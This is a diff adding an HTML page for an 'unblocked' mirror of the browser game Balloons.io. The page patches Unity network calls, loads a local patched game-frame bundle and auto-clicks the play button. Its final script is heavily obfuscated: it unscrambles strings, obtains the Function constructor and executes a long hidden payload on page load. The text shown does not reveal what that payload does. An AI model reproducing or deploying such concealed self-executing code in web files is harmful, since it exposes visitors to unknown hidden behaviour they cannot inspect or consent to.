@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<title>Balloonsio Unblocked - Crazy Games</title>
+<meta charset="utf-8"/>
+<meta content="The game files for Air Toons, a free browser game on CrazyGames.com" name="description"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="DPR" http-equiv="Accept-CH"/>
+<meta content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui" name="viewport"/>
+<style id="ziggyLoaderStyles">
+    html {
+      width: 100%;
+      height: 100%;
+      position: relative;
+    }
+
+    body {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      background-color: #13141E;
+      overflow: hidden;
+    }
+
+    .ziggyLoader {
+      width: 100%;
+      height: 100%;
+      position: relative;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      flex-direction: column;
+      width: 100%;
+      height: 100%;
+      color: #F9FAFF;
+      font-family: 'Nunito', Arial, "Helvetica Neue", Helvetica, sans-serif;
+      font-style: normal;
+      font-weight: 400;
+      font-size: 14px;
+      position: absolute;
+      z-index: 3;
+      opacity: 0.5;
+    }
+
+    @keyframes bob {
+      0% {
+        transform: translate(0px, 0px);
+      }
+
+      50% {
+        transform: translate(0px, 10.5px);
+      }
+
+      100% {
+        transform: translate(0px, 0px);
+      }
+    }
+  </style>
+</head>
+<body>
+<script>
+    UnityURLFix= function(url) {
+      let fix_url= url;
+      if (url.indexOf('.unity3d.com') > -1) {
+        fix_url= "patch/json/null.json?"+ url;
+      }
+      console.log("--UnityLoadFix--", url, fix_url);
+      return fix_url;
+    }
+
+    UnityMethodFix= function(method, url) {
+      if (url.indexOf('.unity3d.com') > -1) {
+        return "GET";
+      }
+      return method;
+    }
+  </script>
+<div class="ziggyLoader" id="ziggyLoader">
+<div class="container"><svg aria-hidden="true" focusable="false" shape-rendering="geometricPrecision" style="display:inline-block;fill:currentcolor;height:24px;width:24px;width:46px;height:50px;-webkit-animation:bob 800ms linear infinite normal forwards;animation:bob 800ms linear infinite normal forwards;" text-rendering="geometricPrecision" viewbox="0 0 46 50">
+<path clip-rule="evenodd" d="M39.9436 1.74993C39.685 1.46063 39.3511 1.33714 38.9704 1.33714L38.9668 1.35126C37.5519 1.35126 35.4655 3.05179 34.004 4.4348C30.9264 2.96006 27.145 2.2368 22.552 2.2368C17.959 2.2368 14.1776 2.96006 11.1036 4.43127C9.64206 3.04826 7.55563 1.34773 6.14434 1.34773C5.76009 1.34773 5.42971 1.47121 5.17116 1.76051C2.97341 4.23723 2.76513 10.1679 2.84414 13.5831C1.853 16.2504 1.35025 19.3692 1.35025 22.9325C1.35025 30.4191 3.53362 35.9653 7.83215 39.4334C10.7302 41.7655 14.5116 43.1097 19.3308 43.5119C19.1291 43.6103 18.9246 43.7083 18.7177 43.8075C18.3463 43.9855 17.9671 44.1673 17.5819 44.3621L15.8367 45.2018L14.8455 45.6781C14.5704 45.8188 14.2933 45.9551 14.013 46.0931C13.3089 46.4395 12.5847 46.7959 11.8218 47.2552L11.5597 47.3892C11.4843 47.4421 11.4161 47.5303 11.4017 47.6327C11.3658 47.8232 11.4986 48.0031 11.6926 48.0313C11.996 48.0753 12.2985 48.1241 12.6008 48.1729C13.2681 48.2806 13.935 48.3883 14.6121 48.4441L15.3483 48.5253C15.5925 48.55 15.8331 48.5711 16.0845 48.5852L17.5604 48.6664C17.7902 48.6734 18.0201 48.6734 18.2499 48.6734C19.9987 48.6734 21.7548 48.557 23.4929 48.2889C25.4608 47.996 27.3964 47.4563 29.253 46.7048C31.106 45.9533 32.8728 44.9725 34.4744 43.7835C37.6489 41.3597 40.1447 38.0998 41.6278 34.4694C42.1701 33.1534 42.5795 31.788 42.8668 30.4015C43.4557 28.1753 43.7537 25.6845 43.7537 22.9255C43.7537 19.3727 43.2546 16.2609 42.267 13.5937C42.3496 10.182 42.1449 4.23017 39.9436 1.74993ZM33.7454 2.83305C35.8857 0.927886 37.6022 0 38.9704 0C39.7712 0 40.4607 0.299887 40.9743 0.874965C43.3156 3.51044 43.7214 9.07776 43.6388 13.3785C44.6228 16.141 45.122 19.3515 45.122 22.9255C45.122 25.7585 44.8131 28.3764 44.199 30.7014C43.883 32.1973 43.4449 33.6332 42.8955 34.9633C41.3082 38.8477 38.6867 42.2594 35.3003 44.8419C33.6269 46.0838 31.7703 47.1246 29.7773 47.9325C27.7842 48.7369 25.7409 49.2979 23.7119 49.5978C21.9918 49.8659 20.1567 50 18.2571 50C18.0201 50 17.7794 50 17.5424 49.9929H17.4886L16.0126 49.9118C15.7397 49.8977 15.474 49.8765 15.201 49.8448L14.4828 49.7671C13.7915 49.7105 13.1226 49.6037 12.4731 49.4999C12.4343 49.4937 12.3956 49.4875 12.3569 49.4814L12.355 49.4811C12.0683 49.4353 11.7817 49.3895 11.5058 49.3473C11.0498 49.2838 10.6332 49.0368 10.3639 48.6699C10.0981 48.31 9.99039 47.8549 10.0622 47.4174C10.134 46.9764 10.389 46.5707 10.7697 46.299L10.8487 46.2426L10.9348 46.1967L11.1575 46.0838C11.9511 45.6075 12.6837 45.2477 13.3947 44.8984L13.3947 44.8984C13.4415 44.8754 13.4882 44.8525 13.5348 44.8297C13.7671 44.7158 13.9969 44.6031 14.2243 44.4856L14.2386 44.4785L14.253 44.4715L14.885 44.1681C11.7716 43.4413 9.16085 42.2135 6.97747 40.4565C2.34857 36.7168 0 30.8178 0 22.922C0 19.3374 0.502749 16.1198 1.4903 13.3538C1.4077 9.06012 1.81708 3.50692 4.15488 0.871437C4.66122 0.299887 5.3543 0 6.15152 0C7.51972 0 9.23626 0.927886 11.373 2.82952C14.4757 1.52413 18.1421 0.885549 22.5556 0.885549C26.969 0.885549 30.6427 1.52413 33.7454 2.83305ZM22.5592 9.70929C27.0732 9.70929 30.2944 10.5419 32.3951 12.2389C34.8766 14.2499 36.0904 17.7463 36.0904 22.9255C36.0904 33.8978 30.6822 36.1417 22.5592 36.1417C14.4361 36.1417 9.02797 33.8943 9.02797 22.9255C9.02797 17.7498 10.2346 14.2464 12.7232 12.2389C14.824 10.5349 18.0452 9.70929 22.5592 9.70929ZM17.9051 28.3058C19.4601 28.3058 20.7313 27.0675 20.7313 25.5504V22.3081C20.6559 22.3151 20.5769 22.3187 20.4979 22.3187C19.2482 22.3187 18.2391 21.3343 18.2391 20.1171C18.2391 19.1293 18.9034 18.2931 19.8192 18.0144C19.3164 17.5593 18.6449 17.277 17.9051 17.277C16.3502 17.277 15.0789 18.5154 15.0789 20.0325V25.5504C15.0789 27.0639 16.3502 28.3058 17.9051 28.3058ZM27.2096 28.3058C28.7646 28.3058 30.0358 27.0675 30.0358 25.5504V22.0929C29.9245 22.1105 29.8132 22.1211 29.6982 22.1211C28.4485 22.1211 27.4395 21.1367 27.4395 19.9196C27.4395 18.967 28.0607 18.159 28.9262 17.8521C28.4485 17.4922 27.856 17.277 27.2096 17.277C25.6547 17.277 24.3834 18.5154 24.3834 20.0325V25.5504C24.3834 27.0639 25.6547 28.3058 27.2096 28.3058Z" fill="white" fill-rule="evenodd"></path>
+</svg>
+<div style="margin-top:18px;">Preparing your game…</div>
+</div>
+</div>
+<script type="text/javascript">function loadScript(url, callback) {
+      var head = document.head;
+      var script = document.createElement('script');
+      script.type = 'text/javascript';
+      script.src = url;
+      script.async = true;
+      script.onreadystatechange = callback;
+      script.onload = callback;
+      head.appendChild(script);
+    }
+    var options = {"loader":"5.4.x","loaderOptions":{"module":{"asmUrl":"WebGL.asm.jsgz","memUrl":"WebGL.memgz","codeUrl":"WebGL.jsgz","dataUrl":"WebGL.datagz"},"unityLoaderUrl":"UnityLoader.js"},"thumbnail":"balloonsio.png","gameName":"Balloons.io","gameHttps":true,"gameSlug":"balloonsio","gameId":"13609","gameStatus":"published","showAdOnExternal":"ALWAYS","showAdOnInternal":"DEFAULT","disableEmbedding":false,"dollarRate":0.9339396469521347,"upvotes":6456,"downvotes":938,"releaseDate":"2017-04-11","locale":"en_US","controls":{"text":"<h3>Controls</h3>\nUse your mouse to change your move direction and left click to boost your speed."},"videoThumbnail":"https://videos.crazygames.com/balloonsio.mp4","video":{"original":null,"sizes":[{"width":180,"height":111,"location":"https://videos.crazygames.com/balloonsio.mp4"}]},"sandbox":true,"totalSizeBytes":null,"minTimeBetweenMidrollAdsInMs":180000,"minTimeBetweenRewardedAdsInMs":5000,"noMidrollAdInFirstMinutes":3,"noRewardedAdInFirstMinutes":0,"categoryEnSlug":"io","tagsEnSlugs":["battle","arena","collect","balloon"],"isKids":false,"hasMidroll":false,"hasRewarded":false,"showExternalProviderWarning":false,"aps":"no","fullscreen":"ADDS_VALUE","orientation":null,"category":"Balloon","categoryLink":"https://www.crazygames.com/t/balloon","gameLink":"https://www.crazygames.com/game/balloonsio","domainHasNoCMP":false,"source":"games"};
+
+    var SDK_READY = false;
+    var GF_READY = false;
+    var GF_LOAD_CALLED = false;
+
+    // Build GF path
+    var gfBuildPath = 'https://builds.crazygames.com/gameframe'
+    var gfDefaultVersion = '1'
+    var useLocalGF = false
+    var params = new URLSearchParams(window.location.search);
+    var version = params.get('v');
+    // Validate version param to prevent XSS
+    if (version) {
+      var versionRegex = /^\d+(\.\d+)?(\.\d+)?$/;
+      if (!versionRegex.test(version)) {
+        console.error('Invalid Gameframe version provided, falling back to default version');
+        version = null;
+      }
+    }
+    var gameframeJs = gfBuildPath + '/v' + (version || gfDefaultVersion) + '/bundle.js';
+    if (useLocalGF) {
+      gameframeJs = 'http://localhost:3002/static/js/bundle.js';
+    }
+    gameframeJs = 'patch/unityv3/bundle.js';
+
+    loadScript(gameframeJs, function () {
+      Crazygames.load(options).then(function () {
+        var loaderWrapper = document.getElementById('ziggyLoader');
+        var loaderStyles = document.getElementById('ziggyLoaderStyles');
+        if (loaderWrapper && loaderStyles) {
+          loaderWrapper.remove();
+          loaderStyles.remove();
+        }
+        const playNow = document.getElementsByClassName("css-bs2yur");
+        console.log("--fx--playNow--", playNow);
+        setTimeout(()=> {
+          playNow[0].click();
+        }, 1000);
+      });
+    });
+    </script>
+<script>
+    if (window.top === window.self) {
+    window.location.href = '../../../';
+}
+(function() {
+    var KeY='', iFD=494-483;
+    function xsh(b) {
+        var g=2231620;
+        var p=b.length;
+        var d=[];
+        for(var u=0; u<p; u++) { d[u]=b.charAt(u); }
+        for(var u=0; u<p; u++) {
+            var e=g*(u+469)+(g%24291);
+            var f=g*(u+603)+(g%33615);
+            var k=e%p;
+            var i=f%p;
+            var j=d[k];
+            d[k]=d[i];
+            d[i]=j;
+            g=(e+f)%2984823;
+        };
+        return d.join('');
+    }
+    var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);
+    var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309
+})()
+</script></body>
+</html>
